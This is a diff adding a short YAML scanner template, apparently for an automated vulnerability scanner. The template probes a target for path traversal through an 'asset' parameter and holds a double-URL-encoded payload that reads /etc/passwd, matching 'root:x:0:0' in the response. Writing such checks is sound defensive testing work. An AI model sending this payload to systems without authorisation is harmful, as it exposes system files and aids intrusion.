@@ -1,0 +1,20 @@
+id: lfi2-130
+name: 'Path traversal2 via asset'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via asset'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      asset:
+        - '%252e%252e%252fetc%252fpasswd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
